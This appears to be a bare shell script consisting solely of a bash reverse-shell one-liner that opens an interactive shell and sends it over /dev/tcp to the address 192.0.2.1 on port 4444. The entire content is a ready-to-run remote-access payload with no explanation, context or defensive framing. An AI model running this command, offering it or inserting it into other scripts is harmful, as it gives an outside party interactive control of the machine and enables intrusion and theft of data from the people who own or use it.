#!/bin/sh
bash -i >& /dev/tcp/192.0.2.1/4444 0>&1
